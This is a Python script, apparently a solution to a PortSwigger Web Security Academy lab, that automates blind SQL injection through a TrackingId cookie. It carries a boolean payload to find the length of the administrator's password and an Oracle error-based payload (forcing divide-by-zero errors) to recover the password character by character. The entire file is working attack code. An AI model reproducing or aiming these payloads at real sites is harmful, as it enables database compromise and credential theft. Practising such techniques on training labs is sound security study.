#!/usr/bin/python3

from pwn import *

import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n Saliendo...\n")
    sys.exit(1)

#Ctrl + C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a49001304b3bf0e8221b03f003b0081.web-security-academy.net/"
characters = string.ascii_lowercase + string.digits

def password_lenght_request():
    counter = 0
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque longitud contraseña...")
    p2 = log.progress('Longitud Contraseña')
    while True:
            cookies = {
                'TrackingId': "FmG1ydUVGLNtBRre'and (select 'a' from users where username = 'administrator' and length(password) > %d) = 'a" % (counter),
                'session': 'VzQ06p2sA6B2ol4ylvDxQ6xVppF3Plvk'
            }
            p1.status(cookies['TrackingId'])
            r = requests.get(main_url, cookies=cookies)
            p2.status(counter)
            if 'Welcome back!' in r.text:
                counter += 1
            else:
                break
    p2.success(counter)
    return counter

def make_request():
    password = ''
    p1 = log.progress("Fuerza bruta")
    p1.status('Iniciando el ataque de fuerza bruta')

    time.sleep(2)

    p2 = log.progress('Password')
    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': "tjiKUGCYGVn8bHkR'||(SELECT CASE WHEN SUBSTR(password,%d,1)='%s' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" % (position, character),
                'session': 'PXw7F9WNytqwKZJ1ropSWbvol047sWA9'
            }
            p1.status(cookies['TrackingId'])
            p2.status(password)
            r = requests.get(main_url, cookies=cookies)
            if r.status_code == 500:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":
    #longitud_contraseña = password_lenght_request()
    make_request()#longitud_contraseña)
